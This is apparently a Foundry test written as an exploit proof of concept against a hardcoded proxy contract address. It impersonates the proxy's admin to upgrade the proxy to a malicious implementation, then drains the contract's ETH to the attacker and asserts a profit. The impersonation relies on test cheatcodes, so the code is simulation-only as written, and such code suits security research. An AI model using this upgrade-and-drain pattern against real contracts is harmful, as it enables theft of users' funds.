// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITransparentUpgradeableProxy {
    function upgradeTo(address newImplementation) external;
}

interface IMaliciousProxy {
    function drain(address payable to) external;
}

contract MaliciousImplementation {
    function drain(address payable to) external {
        (bool success, ) = to.call{value: address(this).balance}("");
        require(success, "Drain failed");
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xe4D810feb232eA08373a79A826b4955D72732f10;
    address attacker = address(this);
    address admin;
    bytes32 constant _ADMIN_SLOT = 0xB53127684a568b3173Ae13B9f8a6016E243e63B6e8ee1178d6a717850b5d6103;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        deal(TARGET, 100 ether);
        admin = address(uint160(uint256(vm.load(TARGET, _ADMIN_SLOT))));
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = attacker.balance;

        MaliciousImplementation maliciousImpl = new MaliciousImplementation();

        vm.startPrank(admin);
        ITransparentUpgradeableProxy(TARGET).upgradeTo(address(maliciousImpl));
        vm.stopPrank();

        IMaliciousProxy(TARGET).drain(payable(attacker));

        assertGt(attacker.balance, initialBalance);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

